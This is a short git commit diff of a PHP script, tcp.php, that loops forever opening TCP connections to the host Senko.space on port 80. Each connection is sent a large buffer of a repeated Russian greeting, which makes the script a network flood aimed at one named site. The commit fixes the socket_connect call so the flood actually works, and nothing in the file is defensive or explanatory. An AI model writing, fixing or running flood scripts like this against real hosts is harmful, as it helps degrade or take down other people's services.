86a57b4068242b8bae215cd2544c650fee3c89c2
Barashkadevs <58213059+Barashkadevs@users.noreply.github.com>
2020-03-20 10:49:34 +0500

    Add files via upload

--- tcp.php
+++ tcp.php
@@ -3,7 +3,7 @@
 while(true) {
 	$buffer = str_repeat("Привет, Тумблер!", mt_rand(5000, 10000));
 	$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-	socket_connect("Senko.space", 80);
+	socket_connect($socket, "Senko.space", 80);
 	socket_send($socket, $buffer, strlen($buffer), 0);
 	}
 ?>
